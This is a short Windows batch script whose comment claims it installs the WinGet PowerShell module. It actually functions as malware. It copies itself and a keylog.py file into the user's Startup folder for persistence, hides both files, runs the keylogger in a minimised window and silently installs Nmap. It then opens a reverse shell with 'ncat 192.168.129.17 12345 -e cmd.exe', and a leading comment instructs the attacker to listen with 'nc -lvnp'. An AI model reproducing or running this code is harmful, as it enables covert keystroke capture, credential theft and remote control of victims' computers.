:: from receiver side please write nc -lvnp port number 

 @echo off
:: Install WinGet PowerShell module from PSGallery
if  exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (start /min cmd /c  "cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" &  python    "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keylog.py" &  attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keylog.py" "
) else (

start /min cmd /c "curl -o AppInstaller.msixbundle https://aka.ms/getwinget  &  winget --version & winget install Insecure.Nmap --accept-package-agreements --accept-source-agreements --silent &  attrib +h "AppInstaller.msixbundle""

start  /min cmd /c  "xcopy /H "%~dpnx0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" &  attrib +h "%~dpnx0" &  xcopy /H "keylog.py" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" &  attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keylog.py" &  attrib -h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0""
start  /min cmd /c  "cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" & python "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keylog.py""
)

start /min cmd /c  "ncat  192.168.129.17 12345 -e cmd.exe"
